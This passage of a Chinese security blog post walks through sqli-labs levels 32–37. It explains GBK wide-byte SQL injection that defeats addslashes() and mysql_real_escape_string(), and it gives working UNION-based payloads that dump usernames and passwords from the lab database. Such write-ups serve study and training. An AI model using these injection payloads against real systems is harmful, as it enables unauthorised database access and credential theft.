+<li><code>%bb</code>连带<code>\</code><br>如果程序的默认字符集是<code>GBK</code>等宽字节字符集，就有可能产生宽字节注入，绕过上述过滤。<br>若在 PHP 中使用<code>mysql_query(&quot;set names gbk&quot;)</code>将默认字符集设为<code>GBK</code>，而使用<code>addslashes()</code>转义用户输入，这时如果用户输入<code>%bb%27</code>，则<code>addslashes()</code>会在<code>%27</code>前面加上一个<code>%5c</code>字符，即转义字符<code>\</code>。<br>而 MySQL 在使用<code>GBK</code>编码时，会认为两个字符为一个汉字，<code>%bb%5c</code>是一个宽字符（前一个 ASCII 码大于 128 才能到汉字的范围），也就是<code>籠</code>，也就是说<code>%bb%5c%27</code>=<code>籠&#39;</code>，这样单引号就未被转义能闭合语句，从而产生 SQL 注入。<code>%bb</code>并不是唯一一个可以产生宽字节注入的字符，理论上<code>%81</code>-<code>%FE</code>均可。</li>
+<li>过滤<code>\&#39;</code>中的<code>\</code><br>构造<code>%bb%5c%5c%27</code>，<code>addslashes()</code>会在两个<code>%5c</code>和<code>%27</code>前都加上<code>\</code>即<code>%5c</code>，变为<code>%bb %5c%5c %5c%5c %5c%27</code>，但宽字符集认为<code>%bb%5c</code>是一个字符即<code>籠</code>，则变为<code>%bb%5c %5c%5c %5c%5c %27</code>即<code>籠\\\\&#39;</code>，四个<code>\</code>正好转义为两个<code>\</code>，即<code>&#39;</code>未被转义。</li>
+</ol>
+<p><a href="https://www.jianshu.com/p/fa6664786f73" target="_blank" rel="noopener">参考文章链接</a></p>
+<p>这里还可以用%df来讲<code>\</code>吃掉，组合成一个新的汉字<br><img src="/2020/03/17/sqli_labs21-37/../../../Users/%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" alt><br>然后使用–+闭合<br>经过测试，发现是单引号闭合的宽字节注入</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">-1</span>%df%<span class="number">27</span>union%<span class="number">20</span>select%<span class="number">201</span>,group_concat(id,password),<span class="number">3</span>%<span class="number">20f</span>rom%<span class="number">20</span>users--+</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/17/sqli_labs21-37/../../../Users/%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" alt></p>
+<h1 id="less-33"><a href="#less-33" class="headerlink" title="less-33"></a>less-33</h1><p>本关直接使用了 PHP 的<code>addslashes()</code>函数，在 Less 17 中介绍过：</p>
+<h2 id="addslashes-与stripslashes-函数"><a href="#addslashes-与stripslashes-函数" class="headerlink" title="addslashes()与stripslashes()函数"></a>addslashes()与stripslashes()函数</h2><p><code>addslashes(string)</code>函数返回在预定义字符之前添加<strong>反斜杠</strong><code>\</code>的字符串：</p>
+<ul>
+<li>单引号 <code>&#39;</code> </li>
+<li>双引号 <code>&quot;</code> </li>
+<li>反斜杠 <code>\</code> </li>
+<li>空字符 <code>NULL</code> </li>
+</ul>
+<p>该函数可用于为存储在数据库中的字符串以及数据库查询语句准备字符串。</p>
+<blockquote>
+<p><strong>注意：</strong>默认地，PHP对所有的GET、POST和COOKIE数据自动运行<code>addslashes()</code>。所以不应对已转义过的字符串使用<code>addslashes()</code>，因为这样会导致双层转义。遇到这种情况时可以使用函数<code>get_magic_quotes_gpc()</code>进行检测。</p>
+</blockquote>
+<p><code>stripslashes(string)</code>函数删除由<code>addslashes()</code>函数添加的反斜杠。</p>
+<p>注入方法与33一样<br><img src="/2020/03/17/sqli_labs21-37/../../../Users/%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" alt></p>
+<h1 id="less-34"><a href="#less-34" class="headerlink" title="less-34"></a>less-34</h1><p>这一关为post提交方式<br>先抓包，发现也是宽字节注入，只是提交参数方式不同</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1%df'union <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/17/sqli_labs21-37/../../../Users/%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" alt></p>
+<h1 id="less-35"><a href="#less-35" class="headerlink" title="less-35"></a>less-35</h1><p>这一关一开始以为也是宽字节注入，后面发现无论怎么都不能闭合，但是仔细一看回显，发现了问题。如果是宽字节注入，当<code>&#39;</code>被<code>\</code>转义后应该正常回显，但是这一关却报错。<img src="/2020/03/17/sqli_labs21-37/../../../Users/%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" alt><br>所以尝试一下数字型注入，发现成功。与less-1一样</p>
+<h1 id="less-36"><a href="#less-36" class="headerlink" title="less-36"></a>less-36</h1><h2 id="mysql-real-escape-string-函数"><a href="#mysql-real-escape-string-函数" class="headerlink" title="mysql_real_escape_string()函数"></a>mysql_real_escape_string()函数</h2><blockquote>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="constructor">_real_escape_string(<span class="params">string</span>,<span class="params">connection</span>)</span></span><br></pre></td></tr></table></figure>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>string</td>
+<td>必需，规定要转义的字符串</td>
+</tr>
+<tr>
+<td>connection</td>
+<td>可选，规定MySQL连接。如果未规定，则使用上一个连接</td>
+</tr>
+</tbody></table>
+<p><code>mysql_real_escape_string()</code>函数转义 SQL 语句中使用的字符串中的特殊字符：</p>
+<ul>
+<li><code>\x00</code></li>
+<li><code>\n</code></li>
+<li><code>\r</code></li>
+<li><code>\</code></li>
+<li><code>&#39;</code></li>
+<li><code>&quot;</code></li>
+<li><code>\x1a</code></li>
+</ul>
+<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回<code>FALSE</code>。</p>
+<blockquote>
+<p>本函数将字符串中的特殊字符转义，并考虑到连接的当前字符集，因此可以安全用于<code>mysql_query()</code>，可使用本函数来预防数据库攻击。</p>
+</blockquote>
+<p>与less-32一样</p>
+<h1 id="less-37"><a href="#less-37" class="headerlink" title="less-37"></a>less-37</h1><p>这关又是post，注入方法与less-34一样<img src="/2020/03/17/sqli_labs21-37/../../../Users/%E5%8D%8E%E7%A1%95/Desktop/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" alt></p>
+<p>page2到这里就结束了！听物理课了</p>
+<p><a href="https://www.jianshu.com/p/fa6664786f73" target="_blank" rel="noopener">参考文章链接</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    <div>
+      
+        
+<div class="my_post_copyright">
+  <script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+  <!-- JS库 sweetalert 可修改路径 -->
+  <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
+  <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
+  <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
+  <span>文章作者:</span><a href="/" title="访问 CyzCc 的个人博客">CyzCc</a><br>
+  <span>最后更新:</span>2020年04月17日 09:04:23<br>
+  <span>原始链接:</span><a href="/2020/03/17/sqli_labs21-37/" title="sqli-labs21-37">https://cyzcc.vip/2020/03/17/sqli_labs21-37/</a><br>
+  <span>版权声明:</span>转载请注明出处！<br>  
+</div>
+
+      
+</div>
+	
+	
+
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>您的支持就是我的动力！</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="CyzCc Thanks"/>
+        <p>Thanks</p>
+      </div>
+    
+
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+      <div>
+        
+          <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------　　　　本文结束　<i class="fa fa-heart"></i>　感谢您的阅读　　　　-------------</div>
+    
+</div>
+
+        
+      </div>
+
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sqli-labs/" rel="tag"><i class="fa fa-tag"></i> sqli_labs</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/03/15/BUU-Web%E4%B8%80/" rel="next" title="BUU-Web">
+                <i class="fa fa-chevron-left"></i> BUU-Web
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/03/20/AI-Web1/" rel="prev" title="vulnhub靶机AI-Web1.0">
+                vulnhub靶机AI-Web1.0 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="CyzCc" />
+            
+              <p class="site-author-name" itemprop="name">CyzCc</p>
+              <p class="site-description motion-element" itemprop="description">卍~~黑玫瑰将再次绽放~~卐</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">58</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">17</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="1643277253@qq.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://www.heibanke.com/lesson/crawler_ex00/" target="_blank" title="爬虫闯关">
+                      
+                        <i class="fa fa-fw fa-globe"></i>爬虫闯关</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://adworld.xctf.org.cn/" target="_blank" title="攻防世界">
+                      
+                        <i class="fa fa-fw fa-globe"></i>攻防世界</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://buuoj.cn/" target="_blank" title="BUUCTF">
+                      
+                        <i class="fa fa-fw fa-globe"></i>BUUCTF</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://ctf.bugku.com/" target="_blank" title="BUGKU">
+                      
+                        <i class="fa fa-fw fa-globe"></i>BUGKU</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://xss-quiz.int21h.jp/" target="_blank" title="XSS-challenges">
+                      
+                        <i class="fa fa-fw fa-globe"></i>XSS-challenges</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://ctf.hutc.xyz/" target="_blank" title="HUCTF">
+                      
+                        <i class="fa fa-fw fa-globe"></i>HUCTF</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://paper.seebug.org/" target="_blank" title="Paper">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Paper</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="http://hkyx.myhack58.com/" target="_blank" title="黑客闯关游戏">
+                      
+                        <i class="fa fa-fw fa-globe"></i>黑客闯关游戏</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://www.freebuf.com/" target="_blank" title="FreeBuf">
+                      
+                        <i class="fa fa-fw fa-globe"></i>FreeBuf</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-globe"></i>CSDN</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://wiki.0-sec.org/#/dashboard" target="_blank" title="Zero Security">
+                      
+                        <i class="fa fa-fw fa-globe"></i>Zero Security</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          <div id="days"></div>
+<script>
+function show_date_time(){
+window.setTimeout("show_date_time()", 1000);
+BirthDay=new Date("10/30/2019 15:13:14");
+today=new Date();
+timeold=(today.getTime()-BirthDay.getTime());
+sectimeold=timeold/1000
+secondsold=Math.floor(sectimeold);
+msPerDay=24*60*60*1000
+e_daysold=timeold/msPerDay
+daysold=Math.floor(e_daysold);
+e_hrsold=(e_daysold-daysold)*24;
+hrsold=setzero(Math.floor(e_hrsold));
+e_minsold=(e_hrsold-hrsold)*60;
+minsold=setzero(Math.floor((e_hrsold-hrsold)*60));
+seconds=setzero(Math.floor((e_minsold-minsold)*60));
+document.getElementById('days').innerHTML="已运行 "+daysold+" 天 "+hrsold+" 小时 "+minsold+" 分 "+seconds+" 秒";
+}
+function setzero(i){
+if (i<10)
+{i="0" + i};
+return i;
+}
+show_date_time();
+</script>
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#less-21"><span class="nav-number">1.</span> <span class="nav-text">less-21</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-22"><span class="nav-number">2.</span> <span class="nav-text">less-22</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-23"><span class="nav-number">3.</span> <span class="nav-text">less-23</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-24"><span class="nav-number">4.</span> <span class="nav-text">less-24</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#二次注入："><span class="nav-number">4.1.</span> <span class="nav-text">二次注入：</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-25"><span class="nav-number">5.</span> <span class="nav-text">less-25</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#过滤绕过"><span class="nav-number">5.1.</span> <span class="nav-text">过滤绕过</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-25a"><span class="nav-number">6.</span> <span class="nav-text">less-25a</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-26"><span class="nav-number">7.</span> <span class="nav-text">less-26</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#正确注入："><span class="nav-number">7.1.</span> <span class="nav-text">正确注入：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#报错注入"><span class="nav-number">7.2.</span> <span class="nav-text">报错注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-26a"><span class="nav-number">8.</span> <span class="nav-text">less-26a</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-27"><span class="nav-number">9.</span> <span class="nav-text">less-27</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-27a"><span class="nav-number">10.</span> <span class="nav-text">less-27a</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-28"><span class="nav-number">11.</span> <span class="nav-text">less-28</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-28a"><span class="nav-number">12.</span> <span class="nav-text">less-28a</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-29"><span class="nav-number">13.</span> <span class="nav-text">less-29</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-30"><span class="nav-number">14.</span> <span class="nav-text">less-30</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-31"><span class="nav-number">15.</span> <span class="nav-text">less-31</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-32"><span class="nav-number">16.</span> <span class="nav-text">less-32</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字节注入"><span class="nav-number">16.1.</span> <span class="nav-text">宽字节注入</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-33"><span class="nav-number">17.</span> <span class="nav-text">less-33</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#addslashes-与stripslashes-函数"><span class="nav-number">17.1.</span> <span class="nav-text">addslashes()与stripslashes()函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-34"><span class="nav-number">18.</span> <span class="nav-text">less-34</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-35"><span class="nav-number">19.</span> <span class="nav-text">less-35</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-36"><span class="nav-number">20.</span> <span class="nav-text">less-36</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#mysql-real-escape-string-函数"><span class="nav-number">20.1.</span> <span class="nav-text">mysql_real_escape_string()函数</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#less-37"><span class="nav-number">21.</span> <span class="nav-text">less-37</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cyzCc</span>
+
+ <!-- 
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">150.4k</span>
+  
+
+</div>
+
+-->
+
+
+
+
+
+
+<!-- 新增访客统计代码 -->
+<!--<div class="busuanzi-count">
+    <script async="" src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      访问用户： <span class="busuanzi-value" id="busuanzi_value_site_uv"></span> 人
+    </span>
+    <div class="powered-by"></div>
+    <span class="site-uv">
+      <i class="fa fa-eye"></i>
+      访问次数： <span class="busuanzi-value" id="busuanzi_value_site_pv"></span> 次
+    </span>
+    <!-- 博客字数统计 -->
+    <span class="site-pv">
+      <i class="fa fa-pencil"></i>
+      博客全站共： <span class="post-count">150.4k</span> 字
+    </span>
+	  <a href="http://www.beian.miit.gov.cn" target="_blank" rel="noopener">蜀ICP备20017267号</a>
+</div>
+<!-- 新增访客统计代码 END-->
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>访问人数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
